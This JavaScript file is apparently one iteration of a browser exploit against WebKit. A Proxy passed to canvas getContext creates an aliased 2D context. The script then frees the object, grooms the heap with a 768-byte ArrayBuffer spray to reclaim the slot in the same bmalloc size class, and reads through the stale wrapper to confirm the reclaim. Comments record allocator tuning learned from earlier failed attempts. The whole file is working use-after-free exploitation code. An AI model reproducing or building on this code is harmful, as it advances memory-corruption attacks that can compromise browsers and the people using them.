// c018: the V527 reclaim sequence, with the three mistakes from c015-c017 removed.
//
// 1. NO beacons (or any other allocation) between the free and the spray. Beacon XHRs/Image loads allocate
//    in the same size class and steal the slot - this is very likely why c015 and c017 never reclaimed.
//    Every beacon is deferred until after the read.
// 2. bmalloc class 67 holds the 712-byte CanvasRenderingContext2D, and a 768-byte ArrayBuffer lands in that
//    same class, so AB(768) is the correct spray (our earlier 768 assumption was accidentally right, but the
//    ASAN-reported object size of 712 is what the class actually holds).
// 3. Free the *aliased owner* first, then churn GC and wait, then spray. Freeing and spraying back-to-back
//    races bmalloc's deferred free (m_objectLog, flushed at 512 entries), so the slot is not yet released.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() {
    // Only called after the read: these allocations are same-class competitors.
    for (var i = 0; i < LOG.length; i++) {
      try { navigator.sendBeacon('/beacon', 'c018-' + LOG[i]); } catch (e) {}
    }
  }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function proxySettings(c, cap) {
    var fired = false;
    function fire() { if (!fired) { fired = true; cap.inner = c.getContext('2d'); } }
    return new Proxy({}, {
      get: function (o, p) { fire(); return false; },
      has: function (o, p) { fire(); return true; }
    });
  }

  function mkCanvas(i) {
    var c = document.createElement('canvas');
    c.width = 8; c.height = 8; c.id = 's' + i;
    return [c, c.getContext('2d')];
  }

  (async function () {
    note('boot');
    var cap = { inner: null, outer: null };
    var c1 = document.createElement('canvas');
    c1.width = 8; c1.height = 8; c1.id = 'orig';
    try { cap.outer = c1.getContext('2d', proxySettings(c1, cap)); }
    catch (e) { note('trigger-threw:' + e.name); flush(); return; }

    // --- silent window: no beacons until the read completes ---
    var sp = [];
    for (var i = 0; i < 500; i++) sp.push(mkCanvas(i));
    note('sprayed:' + sp.length + ' trig=' + (!!cap.inner && !!cap.outer));

    var ident = '?', idx = -1;
    try { ident = cap.inner.canvas.id; } catch (e) { note('alias-read-err:' + e.name); flush(); return; }
    if (ident && ident.charAt(0) === 's') idx = parseInt(ident.slice(1), 10);
    note('alias:' + ident + '@' + idx);
    if (idx < 0) { flush(); return; }

    // Free the aliased owner: drop both the element and its 2d wrapper.
    var keep = sp[idx]; sp[idx] = null; keep[0] = null; keep[1] = null;

    // Churn memory without touching class 67, so bmalloc processes its deferred-free log.
    try {
      var j = [];
      for (var k = 0; k < 6; k++) j.push(new Float64Array(4 * 1024 * 1024));
      note('churn:ok');
      j = null;
    } catch (e) { note('churn-err:' + e.name); }
    await sleep(1200);

    // AB spray in the same class, marker in every 8-byte slot.
    var abs = [];
    for (i = 0; i < 500; i++) {
      var ab = new ArrayBuffer(768);
      var f64 = new Float64Array(ab);
      for (var s = 0; s < 96; s++) f64[s] = 9999.99;
      abs.push(ab);
    }
    await sleep(300);

    // --- the oracle: read through the stale wrapper ---
    var verdict = 'no-read';
    try {
      var lw = cap.inner.lineWidth;
      verdict = 'lw=' + lw + (lw === 9999.99 ? ' RECLAIMED' : ' no-reclaim');
    } catch (e) { verdict = 'lw-err:' + e.name; }
    note(verdict);

    if (verdict.indexOf('RECLAIMED') >= 0) {
      try { note('dash:' + cap.inner.getLineDash().length); } catch (e) { note('dash-err:' + e.name); }
    }
    note('done');
    flush();
  })();
})();
